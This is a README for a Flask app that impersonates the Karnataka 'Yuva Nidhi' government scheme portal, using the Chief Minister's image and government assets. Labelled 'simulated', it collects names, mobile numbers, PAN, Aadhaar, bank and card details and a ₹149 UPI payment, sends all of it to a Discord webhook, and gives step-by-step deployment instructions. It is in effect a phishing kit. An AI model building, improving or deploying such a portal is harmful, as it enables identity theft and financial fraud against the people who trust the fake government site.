File: README.md

Yuva Nidhi Scheme - Simulated Information Collection Portal

This is a lightweight Flask web application simulating the "Yuva Nidhi" scheme portal. It collects multi-step user data and logs it securely to a Discord webhook — no database is used.


---

✅ Features

Bilingual UI: English + Kannada

Step-wise data collection:

Step 1: Name, Mobile, Age, Parents, CAPTCHA ✅

Step 2: PAN, Aadhaar + Bank/Card info ✅

Step 3: UPI QR ₹149 simulated payment ✅


Auto-redirect & success message

No data storage — logs sent to Discord only

Lightweight: Deployable on Railway, VPS, or Termux



---

📁 Folder Structure

├── app/
│   ├── __init__.py
│   ├── routes.py
│   ├── static/
│   ├── templates/
├── .env
├── config.py
├── requirements.txt
├── Procfile
├── run.py


---

⚙️ Setup Instructions

1. Clone or Download the Code

cd your-folder

2. Create .env

SECRET_KEY=your_very_secret_key
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/xxx

Generate a key:

python -c "import os; print(os.urandom(24).hex())"

3. Create and Activate Virtual Environment

python -m venv venv
source venv/bin/activate  # For Linux/Termux
venv\Scripts\activate    # For Windows

4. Install Requirements

pip install -r requirements.txt

5. Run the App

python run.py

Visit: http://localhost:5000


---

🚀 Deployment

Railway

Push to GitHub

Add Procfile

Set environment variables in Railway dashboard

Click deploy 🚀


Termux

pkg install python git
cd /sdcard/your-folder
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python run.py


---

👥 Credits

CM Image: Siddaramaiah.png UI Assets: gov.png, loading.gif, upi.png (placed in static/images/)


---

✔️ Clean UI — No database — Fast Discord logging — Kannada + English support

